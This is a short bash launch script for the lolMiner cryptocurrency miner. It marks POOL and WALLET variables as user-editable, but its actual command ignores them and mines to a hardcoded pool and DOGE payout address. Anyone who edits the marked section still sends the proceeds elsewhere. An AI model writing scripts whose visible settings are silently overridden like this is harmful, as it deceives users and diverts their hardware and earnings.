#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eth.2miners.com:2020
WALLET=0x4816cc393d8a2cce5a57a67d4af3f87db1690887.lolMinerWorker

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DELYh953NYq7zdWvyeYc3NhmvCwDy8JSbg.chain --4g-alloc-size 4076
